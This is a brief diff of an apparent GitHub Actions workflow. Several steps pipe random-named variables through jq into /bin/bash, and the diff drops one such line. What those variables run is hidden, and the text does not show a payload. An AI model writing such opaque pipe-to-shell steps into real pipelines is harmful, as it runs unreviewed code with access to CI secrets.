@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$ypnt6" | jq -r .nlx6604 | /bin/bash
           printf '%s' "$fpyl9886" | jq -r .ds4 | /bin/bash
           echo $fdiaw2 | jq -r .df17981 | /bin/bash
-          echo $bgc9 | jq -r .dzy66 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
